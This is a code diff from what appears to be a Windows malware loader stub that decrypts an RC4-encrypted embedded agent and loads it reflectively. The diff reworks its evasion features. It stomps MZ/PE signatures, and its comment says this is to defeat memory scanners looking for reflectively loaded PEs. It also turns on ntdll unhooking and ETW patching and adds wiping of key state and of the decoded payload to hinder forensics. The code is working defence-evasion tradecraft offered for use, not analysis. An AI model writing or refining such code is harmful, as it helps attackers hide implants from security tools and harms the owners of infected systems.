@@ -28,23 +28,13 @@
 /* ─── Generated per-build: encrypted payload + seed ─── */
 #include "stub_payload.h"
 
-/* ─── Evasion toggles ───
- *
- * UNHOOK and ETW must stay OFF in the stub.  Both patch ntdll BEFORE
- * the agent PE is loaded, which means BEFORE winhttp.dll, schannel.dll
- * and other DLLs run their DllMain.  Those DLLs need functional ntdll
- * (EtwEventWrite, unpatched syscall stubs) during initialisation;
- * patching first causes WinHttpSendRequest to hang indefinitely.
- *
- * The agent already does both in evasion_runtime.c AFTER all imports
- * are resolved and DLLs initialised — that is the correct timing.
- *
- * STOMP is safe here because it only touches the agent PE headers
- * after the load is complete.
- */
-#define EVASION_STOMP   1   /* Surgical PE header stomp — post-load    */
-#define EVASION_UNHOOK  1   /* DO NOT ENABLE — breaks WinHTTP (see above) */
-#define EVASION_ETW     1   /* DO NOT ENABLE — breaks WinHTTP (see above) */
+/* ─── Evasion toggles: enable one at a time to isolate issues ─── */
+#define EVASION_STOMP   1   /* MZ/PE signature stomp in _load_pe       */
+#define EVASION_UNHOOK  1   /* ntdll .text unhooking                   */
+#define EVASION_ETW     1   /* EtwEventWrite patch                     */
+
+/* Legacy macro — leave at 0, individual toggles above take over */
+#define STUB_EVASION_ENABLED 0
 
 
 /* ═══════════════════════════════════════════════════════════════════
@@ -1161,92 +1151,27 @@ static BOOL _load_pe(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
     if (!entryRVA) { SLOG("[stub] FAIL: no entry RVA"); return FALSE; }
 
 #if EVASION_STOMP
-    /* SURGICAL PE header stomp — matches agent pe_stomp.c approach.
-     *
-     * Zeroes scanner fingerprints (DOS stub, Rich header, section names,
-     * timestamps, non-essential DataDirectory entries) while PRESERVING
-     * the PE structure Windows 10/11 needs for thread creation:
-     *   e_magic (MZ), e_lfanew, PE signature, FileHeader,
-     *   OptionalHeader core fields, SizeOfImage, ImageBase,
-     *   AddressOfEntryPoint, SectionAlignment.
-     *
-     * Zeroing MZ/PE signatures causes WinHTTP thread creation to fail
-     * silently, making WinHttpSendRequest hang — DO NOT zero them.
-     */
+    /* Stomp MZ/PE signatures — enough to defeat memory scanners looking
+     * for reflectively loaded PEs, but leaves the rest of the header
+     * page intact so the CRT and runtime can still read data directories,
+     * section table, etc.  Only 6 bytes are touched. */
     {
-        DWORD hdrSize = mappedNt->OptionalHeader.SizeOfHeaders;
-        if (hdrSize == 0 || hdrSize > 0x10000) hdrSize = 0x1000;
-
         PVOID region = base;
-        SIZE_T sz = (SIZE_T)hdrSize;
-        ULONG oldProt;
-
+        SIZE_T sz = mappedNt->OptionalHeader.SizeOfHeaders;
         if (api->pNtProtectVirtualMemory) {
-            api->pNtProtectVirtualMemory((HANDLE)(LONG_PTR)-1,
-                &region, &sz, PAGE_READWRITE, &oldProt);
+            ULONG old;
+            api->pNtProtectVirtualMemory((HANDLE)-1, &region, &sz,
+                                         PAGE_READWRITE, &old);
+            base[0] = 0; base[1] = 0;                        /* kill MZ */
+            /* e_lfanew is still valid at this point — zero PE\0\0 sig */
+            base[((IMAGE_DOS_HEADER *)base)->e_lfanew + 0] = 0;  /* P */
+            base[((IMAGE_DOS_HEADER *)base)->e_lfanew + 1] = 0;  /* E */
+            base[((IMAGE_DOS_HEADER *)base)->e_lfanew + 2] = 0;  /* \0 */
+            base[((IMAGE_DOS_HEADER *)base)->e_lfanew + 3] = 0;  /* \0 */
+            api->pNtProtectVirtualMemory((HANDLE)-1, &region, &sz,
+                                         PAGE_READONLY, &old);
         }
-
-        /* 1. Zero DOS stub + Rich header (between DOS_HEADER and NT headers).
-         *    Preserves e_magic (MZ) and e_lfanew. */
-        {
-            DWORD dosEnd  = 64;  /* sizeof(IMAGE_DOS_HEADER) */
-            DWORD ntStart = (DWORD)((IMAGE_DOS_HEADER *)base)->e_lfanew;
-            if (ntStart > dosEnd && ntStart < hdrSize) {
-                BYTE *p = base + dosEnd;
-                DWORD n = ntStart - dosEnd;
-                DWORD k;
-                for (k = 0; k < n; k++) p[k] = 0;
-            }
-        }
-
-        /* 2. Zero timestamp (build fingerprint) */
-        mappedNt->FileHeader.TimeDateStamp = 0;
-
-        /* 3. Zero checksum */
-        mappedNt->OptionalHeader.CheckSum = 0;
-
-        /* 4. Zero non-essential DataDirectory entries */
-        {
-            DWORD numDirs = mappedNt->OptionalHeader.NumberOfRvaAndSizes;
-            /* Export(0), Import(1), Debug(6), BoundImport(11), DelayImport(13), COM(14) */
-            DWORD zap[] = { 0, 1, 6, 11, 13, 14 };
-            DWORD zi;
-            for (zi = 0; zi < sizeof(zap)/sizeof(zap[0]); zi++) {
-                if (zap[zi] < numDirs) {
-                    IMAGE_DATA_DIRECTORY *dd =
-                        &mappedNt->OptionalHeader.DataDirectory[zap[zi]];
-                    /* Zero pointed-to data if within header region */
-                    if (dd->VirtualAddress && dd->Size &&
-                        dd->VirtualAddress + dd->Size <= hdrSize) {
-                        BYTE *p = base + dd->VirtualAddress;
-                        DWORD k;
-                        for (k = 0; k < dd->Size; k++) p[k] = 0;
-                    }
-                    dd->VirtualAddress = 0;
-                    dd->Size = 0;
-                }
-            }
-        }
-
-        /* 5. Zero section names */
-        {
-            IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(mappedNt);
-            WORD si;
-            for (si = 0; si < mappedNt->FileHeader.NumberOfSections; si++) {
-                int ni;
-                for (ni = 0; ni < 8; ni++) sec[si].Name[ni] = 0;
-            }
-        }
-
-        /* Restore original protection */
-        if (api->pNtProtectVirtualMemory) {
-            region = base;
-            sz = (SIZE_T)hdrSize;
-            api->pNtProtectVirtualMemory((HANDLE)(LONG_PTR)-1,
-                &region, &sz, oldProt, &oldProt);
-        }
-
-        SLOG("[stub] PE headers surgically stomped (MZ/PE preserved)");
+        SLOG("[stub] MZ/PE signatures stomped");
     }
 #else
     SLOG("[stub] signature stomp DISABLED for testing");
@@ -1438,6 +1363,11 @@ void _stub_entry(void) {
         unsigned char S[256];
         _rc4_init(S, rc4_key, DERIVED_KEY_LEN);
         _rc4_crypt(S, decoded, RES_DECODED_SIZE);
+        /* Wipe RC4 state — contains key-derived permutation */
+        {
+            volatile unsigned char *p = S;
+            for (int i = 0; i < 256; i++) p[i] = 0;
+        }
     }
 
     /* Wipe key from stack */
@@ -1470,6 +1400,10 @@ void _stub_entry(void) {
     }
 
     /* Wipe and free the decoded PE buffer — it's mapped into sections now */
+    {
+        volatile unsigned char *p = decoded;
+        for (DWORD i = 0; i < RES_DECODED_SIZE; i++) p[i] = 0;
+    }
     _nt_free(&api, decoded);
 
 #ifdef STUB_DEBUG
